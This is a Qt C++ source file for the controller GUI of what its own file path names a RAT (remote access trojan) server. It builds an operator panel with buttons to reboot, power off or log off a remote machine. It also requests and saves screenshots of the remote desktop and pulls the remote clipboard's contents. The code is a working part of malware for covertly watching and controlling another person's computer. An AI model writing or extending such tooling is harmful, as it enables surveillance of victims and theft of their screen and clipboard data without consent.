#include "host.h"

Host::Host(QWidget *parent) : QWidget(parent){
    vlayout = new QVBoxLayout(this);
    hlayout = new QHBoxLayout();

    grpControl = new QGroupBox(this);
    grpControl->setTitle(tr("Control System"));
    vlayout->addWidget(grpControl);
    grpControl->setLayout(hlayout);

    btnReboot = new QPushButton(tr("Reboot"), this);
    btnReboot->setSizePolicy(QSizePolicy::Maximum, QSizePolicy::Maximum);
    hlayout->addWidget(btnReboot);

    btnPoweroff = new QPushButton(tr("PowerOff"), this);
    btnPoweroff->setSizePolicy(QSizePolicy::Maximum, QSizePolicy::Maximum);
    hlayout->addWidget(btnPoweroff);

    btnLogonOff = new QPushButton(tr("LogonOff"), this);
    btnLogonOff->setSizePolicy(QSizePolicy::Maximum, QSizePolicy::Maximum);
    hlayout->addWidget(btnLogonOff);
    grpControl->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Maximum);

    tabWidget = new QTabWidget(this);
    vlayout->addWidget(tabWidget);

    scrollArea = new QScrollArea(this);
    scrollArea->setWidgetResizable(true);
    scrollArea->setBackgroundRole(QPalette::Dark);

    screenShot = new QLabel(this);    
    screenShot->setBackgroundRole(QPalette::Base);
    screenShot->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);
    screenShot->setScaledContents(true);
    scrollArea->setWidget(screenShot);
    scrollArea->setContextMenuPolicy(Qt::CustomContextMenu);
    tabWidget->addTab(scrollArea, tr("ScreenShot"));

    clip = new ClipBoard(this);
    tabWidget->addTab(clip, tr("ClipBoard"));


    connect(scrollArea, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(contextMenu(QPoint)));
    connect(clip, SIGNAL(sendBuf(DATA&)), this, SIGNAL(send(DATA&)));
}

void Host::screenDesktop(QByteArray data){    
    QString nameFile = QString("D:\\Project\\RAT\\server\\download\\%1.bmp").arg(QDateTime::currentDateTime().toString("dd.MM.yyyy hh.mm"));    
    QFile file(nameFile);
    file.open(QFile::Append);
    file.write(data.data(), data.length());
    file.close();
    screenShot->setPixmap(QPixmap(nameFile));
}

void Host::contextMenu(QPoint pos){
    QMenu *menu = new QMenu(this);
    QAction *screen = new QAction(QIcon(":/ico/screenshot.png"), tr("Screen"), this);
    menu->addAction(screen);

    QAction *clearScreen = new QAction(tr("Clear"), this);
    menu->addAction(clearScreen);

    menu->popup(scrollArea->viewport()->mapToGlobal(pos));
    connect(screen, SIGNAL(triggered()), this, SLOT(getScreenShot()));
    connect(clearScreen, SIGNAL(triggered()), screenShot, SLOT(clear()));
}

void Host::getScreenShot(){
    DATA data;
    data.cmd = SCREEN;
    emit send(data);
}

void Host::setBuffer(QByteArray data){
    clip->insertPlainText(QString::fromLocal8Bit(data));
}

ClipBoard::ClipBoard(QWidget *parent) : QTextEdit(parent){
    setReadOnly(true);
    setContextMenuPolicy(Qt::CustomContextMenu);
    connect(this, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(contextMenu(QPoint)));
}

void ClipBoard::contextMenu(QPoint pos){
    QMenu *menu = new QMenu(this);
    QAction *actUpdate = new QAction(QIcon("://ico/refresh.png"), tr("Update"), this);
    menu->addAction(actUpdate);

    QAction *actClear = new QAction(tr("Clear"), this);
    menu->addAction(actClear);

    menu->popup(viewport()->mapToGlobal(pos));
    connect(actUpdate, SIGNAL(triggered()), this, SLOT(getBuffer()));
    connect(actClear, SIGNAL(triggered()), this, SLOT(clear()));
}

void ClipBoard::getBuffer(){
    data.cmd = CLBUF;
    emit sendBuf(data);
}
